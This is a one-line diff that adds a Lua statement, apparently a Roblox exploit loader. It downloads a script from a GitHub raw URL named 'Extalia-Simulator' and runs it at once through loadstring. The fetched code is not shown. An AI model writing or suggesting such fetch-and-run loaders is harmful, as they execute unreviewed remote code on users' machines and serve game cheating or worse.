@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HenSeu87PofghYT/Extalia-Simulator/main/Nameless%20Scripts"))()
